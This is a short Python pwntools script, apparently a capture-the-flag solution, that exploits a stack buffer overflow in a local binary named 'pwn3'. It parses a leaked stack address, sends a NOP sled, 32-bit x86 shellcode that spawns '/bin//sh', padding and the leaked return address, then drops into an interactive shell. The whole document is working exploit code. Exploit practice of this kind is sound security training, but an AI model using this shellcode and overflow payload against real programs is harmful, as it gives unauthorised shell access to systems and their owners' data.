from pwn import *

p=process('./pwn3')

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
p.recvuntil("number ")
s_addr=int(p.recv(10),16)

payload="\x90"*100+shellcode+"\x90"*117+p32(s_addr)
p.sendlineafter("echo? ",payload)
p.interactive()
